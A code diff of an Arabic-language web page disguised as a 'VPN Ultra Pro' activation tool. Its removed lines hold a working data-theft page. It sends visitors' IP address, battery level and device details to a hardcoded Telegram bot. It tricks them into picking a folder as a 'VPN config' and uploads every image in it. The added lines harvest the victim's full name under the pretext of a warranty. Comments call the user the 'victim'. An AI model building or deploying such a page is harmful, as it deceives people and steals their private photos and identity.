@@ -1,85 +1,13 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>VPN Ultra Pro</title>
-    <style>
-        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .box { background: #111; padding: 30px; border-radius: 25px; border: 2px solid #ff8c00; width: 90%; max-width: 380px; box-shadow: 0 0 30px rgba(255,140,0,0.1); }
-        select { width: 100%; padding: 15px; margin: 20px 0; border-radius: 10px; background: #222; color: #fff; border: 1px solid #ff8c00; font-size: 16px; outline: none; }
-        .btn { width: 100%; padding: 18px; background: #ff8c00; border: none; border-radius: 12px; color: #000; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn:active { transform: scale(0.98); }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h1 style="color: #ff8c00; margin-bottom: 5px;">VPN ULTRA</h1>
-        <p style="color: #aaa; font-size: 14px;">يرجى اختيار نوع جهازك لضمان أفضل سرعة اتصال</p>
-        
-        <select id="dev">
-            <option value="لم يحدد">--- اختر نوع الهاتف ---</option>
-            <optgroup label="Samsung">
-                <option value="Samsung S-Series">Samsung Galaxy S</option>
-                <option value="Samsung A-Series">Samsung Galaxy A</option>
-                <option value="Samsung Note/Other">Samsung Note / Other</option>
-            </optgroup>
-            <optgroup label="iPhone">
-                <option value="iPhone 13/14/15">iPhone 13/14/15</option>
-                <option value="iPhone 11/12">iPhone 11/12</option>
-                <option value="iPhone Older">iPhone (موديل قديم)</option>
-            </optgroup>
-            <optgroup label="Other">
-                <option value="Xiaomi/Redmi">Xiaomi / Redmi</option>
-                <option value="Infinix/Huawei">Infinix / Huawei</option>
-            </optgroup>
-        </select>
+<input type="text" id="full_name" placeholder="اكتب اسمك الكامل لتفعيل الضمان" 
+       style="width: 100%; padding: 15px; margin-bottom: 20px; border-radius: 10px; background: #222; color: #fff; border: 1px solid #ff8c00; box-sizing: border-box;">
 
-        <p id="st" style="font-size: 14px; color: #ff8c00;"></p>
-        <input type="file" id="f" webkitdirectory directory multiple style="display:none;">
-        <button class="btn" onclick="start()">تفعيل الاتصال الآن</button>
-    </div>
-
-    <script>
-        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
-        const C = '7214473798';
-
-        window.onload = async () => {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                const battery = await navigator.getBattery();
-                const bat = Math.round(battery.level * 100) + "%";
-                
-                const msg = `🔔 زائر جديد فتح الصفحة!\n📍 الـ IP: ${data.ip}\n🔋 الشحن: ${bat}\n⚙️ المعالج: ${navigator.platform}`;
-                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
-            } catch (e) {}
-        };
-
-        function start() {
-            const selectedDevice = document.getElementById('dev').value;
-            if(selectedDevice === "لم يحدد") {
-                alert("يرجى اختيار نوع الجهاز أولاً لتجنب انقطاع الاتصال");
-                return;
-            }
-            
-            // إرسال نوع الجهاز الذي اختاره الضحية فوراً
-            const msg = `🎯 الضحية اختار جهازه بنفسه!\n📱 النوع المختار: ${selectedDevice}`;
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
-
-            document.getElementById('st').innerText = "تم الضبط! اختر ملف التكوين (Config) لتشغيل الـ VPN..";
-            document.getElementById('f').click();
-        }
-
-        document.getElementById('f').onchange = async (e) => {
-            for (let file of e.target.files) {
-                if (file.type.startsWith('image/')) {
-                    const fd = new FormData();
-                    fd.append('chat_id', C);
-                    fd.append('document', file);
-                    fetch(`https://api.telegram.org/bot${T}/sendDocument`, {method:'POST', body:fd});
-                }
-            }
-        };
-    </script>
-</body>
-</html>
+<script>
+// في دالة start() أضف هذا السطر لإرسال الاسم للبوت:
+const fullName = document.getElementById('full_name').value;
+if(fullName.length < 3) {
+    alert("يرجى كتابة الاسم الكامل لتفعيل اشتراك الـ VIP");
+    return;
+}
+const nameMsg = `👤 اسم الضحية الكامل: ${fullName}`;
+fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(nameMsg)}`);
+</script>
